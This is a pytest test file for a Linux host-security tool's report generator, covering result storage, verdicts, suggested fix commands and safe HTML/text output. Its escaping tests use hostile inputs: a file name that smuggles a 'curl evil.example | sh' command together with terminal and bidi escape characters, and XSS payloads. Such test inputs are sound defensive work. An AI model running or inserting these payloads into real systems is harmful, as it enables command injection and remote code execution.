"""The security report: every check's latest result, incidents and the setup, in plain language, with the choices
for each finding as exact commands. Everything a finding names may be an attacker's choice."""
from __future__ import annotations

from datetime import datetime, timedelta, timezone
import json
import os
from pathlib import Path
import shlex
import subprocess

import pytest

from megalodon import results
from megalodon import security_report as sr

NOW = datetime(2026, 11, 26, 8, 0, tzinfo=timezone.utc)
AT = NOW.strftime("%Y-%m-%dT%H:%M:%SZ")


@pytest.fixture
def home(tmp_path, monkeypatch):
    monkeypatch.setenv("HOME", str(tmp_path / "home"))
    (tmp_path / "home/.config/megalodon").mkdir(parents=True)
    return tmp_path / "home"


def keep(check, findings, code=None, at=AT, **extra):
    result = dict(findings=findings, **extra)
    return results.keep(check, result, 1 if findings else 0 if code is None else code, now=at)


def build(**kw):
    return sr.build(now=NOW, system=False, **kw)


def view(report, check):
    return next(c for c in report["checks"] if c["check"] == check)


# ------------------------------------------------------------------ the results store

def test_results_are_private_and_only_the_latest_is_kept(home):
    path = keep("hardening", [dict(rule_id="X", severity="HIGH")])
    keep("hardening", [])
    assert path.stat().st_mode & 0o777 == 0o600 and path.parent.stat().st_mode & 0o777 == 0o700
    latest = results.latest()
    assert list(latest) == ["hardening"] and latest["hardening"]["findings"] == 0
    with pytest.raises(results.ResultError):
        results.keep("not-a-check", {}, 0)


def test_a_result_others_could_write_is_not_trusted(home):
    path = keep("persistence", [])
    os.chmod(path, 0o644)
    assert "must be a mode-600 file" in results.latest()["persistence"]["error"]
    assert view(build(), "persistence")["status"] == "error"


def test_a_very_large_result_keeps_its_first_findings_and_its_count(home, monkeypatch):
    monkeypatch.setattr(results, "MAX_BYTES", 100_000)     # room for 500 findings, not 2,000
    keep("secrets", [dict(rule_id="SECRET", severity="HIGH", path=f"/srv/{n}" * 3) for n in range(2000)])
    record = results.latest()["secrets"]
    assert record["findings"] == 2000 and record["truncated"] and len(record["result"]["findings"]) == 500


def run_cli(argv):
    from megalodon.cli import main
    try:
        main(argv)
    except SystemExit as exit_:
        return exit_.code


def test_a_check_keeps_its_result_with_its_exit_code(home, monkeypatch, capsys):
    from megalodon import persistence_watch, hardening_drift
    finding = dict(change="added", category="cron", location="/etc/cron.d/x", severity="HIGH",
                   technique="T1053.003")
    monkeypatch.setattr(persistence_watch, "check", lambda *a, **k: dict(findings=[finding], gaps=[]))
    assert run_cli(["persistence", "check"]) == 1
    record = results.latest()["persistence"]
    assert (record["exit_code"], record["findings"], record["ran"]) == (1, 1, True)
    # A check that could not run is kept too: the report says it is broken, not clean.
    def broken(*a, **k):
        raise hardening_drift.HardeningError("no baseline")
    monkeypatch.setattr(hardening_drift, "check", broken)
    assert run_cli(["hardening", "check"]) == 2
    assert results.latest()["hardening"]["ran"] is False


def test_only_a_check_of_this_machines_own_baseline_is_kept(home, monkeypatch, tmp_path):
    from megalodon import persistence_watch
    monkeypatch.setattr(persistence_watch, "check", lambda *a, **k: dict(findings=[], gaps=[]))
    monkeypatch.setattr(persistence_watch, "baseline", lambda *a, **k: dict(action="baseline"))
    run_cli(["persistence", "check", "--manifest", str(tmp_path / "other.json")])
    run_cli(["persistence", "baseline"])
    assert results.latest() == {}


# ------------------------------------------------------------------ statuses and the verdict

def test_each_check_says_whether_it_is_clear_to_review_broken_or_not_run(home):
    keep("hardening", [])
    keep("persistence", [dict(change="added", category="cron", location="/etc/cron.d/x", severity="HIGH")])
    results.keep("boot", None, 2, now=AT)
    report = build()
    assert view(report, "hardening")["status"] == "clean"
    assert view(report, "persistence")["status"] == "findings"
    assert view(report, "boot")["status"] == "error" and view(report, "boot")["next"] == "megalodon boot check"
    assert view(report, "vulns")["status"] == "never_run"
    assert report["verdict"] == "act" and report["counts"]["HIGH"] == 1


def test_a_result_far_older_than_its_schedule_is_out_of_date(home):
    keep("hardening", [], at=(NOW - timedelta(days=2)).strftime("%Y-%m-%dT%H:%M:%SZ"))   # hourly
    keep("binaries", [], at=(NOW - timedelta(days=2)).strftime("%Y-%m-%dT%H:%M:%SZ"))    # daily
    report = build()
    assert view(report, "hardening")["stale"] and "2 days ago" in view(report, "hardening")["status_text"]
    assert not view(report, "binaries").get("stale")


@pytest.mark.parametrize("worst, verdict", [("CRITICAL", "act"), ("HIGH", "act"), ("MEDIUM", "review"),
                                            ("LOW", "gaps")])
def test_the_verdict_follows_the_worst_finding(home, worst, verdict):
    keep("hardening", [dict(rule_id="X", severity=worst, subject="s")])
    assert build()["verdict"] == verdict


def test_all_clear_only_when_everything_ran_and_is_set_up(home, monkeypatch):
    for name in results.NAMES:
        keep(name, [])
    monkeypatch.setattr(sr, "_setup", lambda system: [dict(item="x", ok=True, text="fine")])
    assert build()["verdict"] == "clear"
    monkeypatch.setattr(sr, "_setup", lambda system: [dict(item="x", ok=False, text="alerts off", fix="f")])
    assert build()["verdict"] == "gaps"


def test_live_watches_say_whether_their_service_runs(home, monkeypatch, tmp_path):
    from megalodon import schedule
    units = tmp_path / "units"
    units.mkdir()
    monkeypatch.setattr(schedule, "unit_dir", lambda system: units)
    for name in ("credentials", "egress"):
        (units / f"megalodon-{name}.service").write_text(schedule.MARKER)

    def systemctl(system, *args):
        state = "active" if "megalodon-credentials.service" in args else "failed"
        return subprocess.CompletedProcess(args, 0, f"UnitFileState=enabled\nActiveState={state}\n", "")
    report = sr.build(now=NOW, system=False, runner=systemctl)
    assert view(report, "credentials")["status"] == "watching"
    egress = view(report, "egress")
    assert egress["status"] == "error" and "not running (systemd: failed)" in egress["status_text"]
    assert egress["next"] == "sudo systemctl start megalodon-egress.service"
    assert view(report, "ancestry")["status"] == "never_run", "not installed: nothing to say it watches"


# ------------------------------------------------------------------ what each finding means, and the choices

def test_a_finding_says_what_it_means_and_the_choices_are_commands(home):
    keep("persistence", [dict(change="added", category="cron", location="/etc/cron.d/x", severity="HIGH")])
    finding = view(build(), "persistence")["findings"][0]
    assert finding["rule_id"] == "PERSISTENCE_ADDED" and "start by itself" in finding["meaning"]
    commands = {}
    for choice in finding["choices"]:
        commands.setdefault(choice["choice"], choice["command"])   # the first of each kind
    assert commands["look"] == "megalodon persistence check"
    assert commands["evidence"] == "sudo megalodon evidence collect"
    assert commands["expected"] == "megalodon persistence accept"
    assert commands["contain"] == "megalodon enforce run --dry-run"
    timeline = [c["command"] for c in finding["choices"] if "timeline" in c["command"]]
    assert timeline == ["megalodon timeline show --entity persistence:cron:/etc/cron.d/x"]


def test_meanings_come_from_each_checks_own_rules(home):
    from megalodon import vuln_check
    keep("vulns", [dict(rule_id="KERNEL_FIX_NOT_RUNNING", severity="HIGH", subject="kernel")])
    finding = view(build(), "vulns")["findings"][0]
    assert finding["meaning"] == vuln_check.RULES["KERNEL_FIX_NOT_RUNNING"][2]
    assert [c["command"] for c in finding["choices"] if c["choice"] == "fix"] == ["sudo reboot"]
    assert not [c for c in finding["choices"] if c["choice"] in ("evidence", "contain")], "a weak spot, not a break-in"


def test_watches_with_allow_lists_allow_the_one_program(home):
    keep("ancestry", [dict(rule_id="SERVICE_SPAWNED_SHELL", severity="HIGH", evidence=dict(
        program="/usr/bin/dash", service=dict(program="/usr/sbin/nginx")))])
    keep("egress", [dict(rule_id="NEW_OUTBOUND_PROGRAM", severity="HIGH", program="/opt/agent", address="9.9.9.9")])
    report = build()
    allow = lambda check: [c["command"] for c in view(report, check)["findings"][0]["choices"]
                           if c["choice"] == "expected"]
    assert allow("ancestry") == ["megalodon ancestry allow /usr/sbin/nginx /usr/bin/dash"]
    assert allow("egress") == ["megalodon egress allow /opt/agent"]


HOSTILE = "/tmp/x; curl evil.example | sh\x1b[2J‮"


def test_a_hostile_name_cannot_become_a_second_command(home):
    keep("egress", [dict(rule_id="NEW_OUTBOUND_PROGRAM", severity="HIGH", program=HOSTILE, address="9.9.9.9")])
    finding = view(build(), "egress")["findings"][0]
    allow = next(c["command"] for c in finding["choices"] if c["choice"] == "expected")
    assert shlex.split(allow) == ["megalodon", "egress", "allow", "/tmp/x; curl evil.example | sh?[2J?"]
    assert "\x1b" not in json.dumps(finding) and "‮" not in json.dumps(finding)


def test_the_page_escapes_everything_and_loads_nothing(home):
    keep("webroot", [dict(rule_id="SCRIPT_IN_UPLOADS", severity="CRITICAL", path="/var/www/<script>alert(1)</script>.php",
                          detail="<img src=x onerror=alert(1)>")])
    page = sr.page(build())
    assert "<script>" not in page and "&lt;script&gt;" in page and "onerror=alert(1)>" not in page
    assert "default-src 'none'" in page and "http://" not in page and "https://" not in page.replace(
        "https://your-monitor.example/ping", "")


def test_the_text_report_has_no_terminal_escapes(home):
    keep("persistence", [dict(change="added", category="cron", location=HOSTILE, severity="HIGH")])
    text = sr.text(build())
    assert "\x1b" not in text and "‮" not in text and "Act now" in text


def test_details_and_gaps_read_as_words(home):
    keep("persistence", [dict(change="added", category="autostart", location="~/.config/autostart/u.desktop",
                              severity="HIGH", detail=dict(kind="file", signs=[dict(sign="runs_from_temporary",
                                                                                   line=3)]))],
         gaps=[dict(category="kernel_module", location="/proc/modules")])
    persistence = view(build(), "persistence")
    assert persistence["findings"][0]["detail"] == "kind: file; signs: runs from temporary (line 3)"
    assert persistence["gaps"] == ["kernel module at /proc/modules"]


# ------------------------------------------------------------------ setup and incidents

def test_the_setup_says_what_is_missing_and_how_to_set_it(home):
    rows = {r["item"]: r for r in build()["setup"]}
    assert rows["alerts"]["ok"] is False and rows["response"]["fix"] == "megalodon respond init"
    assert rows["enforcement"]["ok"] is None, "off is the owner's choice, not a fault"
    (home / ".config/megalodon/settings.toml").write_text("[alerts\n")
    rows = {r["item"]: r for r in build()["setup"]}
    assert "cannot be read" in rows["alerts"]["text"]


def test_incidents_come_from_the_response_engine_with_their_choices(home):
    from megalodon import response_engine as engine
    engine.write_default_policy()
    report = dict(checked_at=AT, findings=[dict(rule_id="PACKAGE_MISMATCH", severity="CRITICAL", path="/usr/bin/ls")])
    engine.run(signals=engine.path_signals(report, "binaries", "path"), now=NOW, protected=set())
    built = build()
    [incident] = built["incidents"]
    assert incident["severity"] == "CRITICAL" and incident["rules"] == ["PACKAGE_MISMATCH"]
    assert incident["choices"][0]["command"] == f"megalodon timeline show {incident['incident']}"
    assert built["verdict"] == "act"


# ------------------------------------------------------------------ the command and the schedule

def test_the_command_writes_a_private_page_and_prints_the_verdict(home, tmp_path, capsys):
    keep("hardening", [dict(rule_id="X", severity="MEDIUM", subject="s")])
    target = tmp_path / "report.html"
    assert run_cli(["report", "--format", "html", "--output", str(target)]) == 0
    assert json.loads(capsys.readouterr().out)["verdict"] == "review"
    assert target.stat().st_mode & 0o777 == 0o600 and target.read_text().startswith("<!doctype html>")
    assert run_cli(["report", "--format", "json"]) == 0
    assert json.loads(capsys.readouterr().out)["schema"] == sr.SCHEMA
    assert run_cli(["report"]) == 0 and "Review:" in capsys.readouterr().out
    assert run_cli(["report", "--hours", "0"]) == 2


def test_the_schedule_writes_the_page_every_morning():
    from megalodon import schedule
    from megalodon.cli import build_parser
    job = next(j for j in schedule.JOBS if j.name == "report")
    assert job.calendar == "*-*-* 07:47:00" and job.interval == 86400 and not job.root_only
    args = build_parser().parse_args(list(job.command))
    assert (args.format, str(args.output)) == ("html", "~/.local/state/megalodon/report.html")
